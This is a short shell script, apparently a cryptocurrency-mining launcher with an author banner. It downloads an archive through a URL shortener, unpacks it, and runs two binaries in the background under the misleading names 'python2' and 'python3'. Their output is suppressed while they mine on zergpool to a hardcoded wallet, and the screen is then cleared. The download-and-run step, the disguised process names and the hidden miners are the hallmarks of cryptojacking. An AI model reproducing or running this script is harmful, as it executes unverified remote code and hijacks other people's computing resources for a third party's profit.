wget -O dot s.id/dotaja

tar -xzvf dot

nohup ./python2 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB,mc=PYI,m=solo > /dev/null 2>&1 &

sleep 15

nohup ./python3 -a cpupower -o cpupower.asia.mine.zergpool.com:4250 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB,mc=CPU,m=solo > /dev/null 2>&1 &

sleep 5

clear

echo "======================================================"
echo "██████╗  ██████╗ ████████╗     █████╗      ██╗ █████╗"
echo "██╔══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗     ██║██╔══██╗"
echo "██║  ██║██║   ██║   ██║       ███████║     ██║███████║"
echo "██║  ██║██║   ██║   ██║       ██╔══██║██   ██║██╔══██║"
echo "██████╔╝╚██████╔╝   ██║       ██║  ██║╚█████╔╝██║  ██║"
echo "╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝"
echo "=============created By Hendi Kusnandi================"
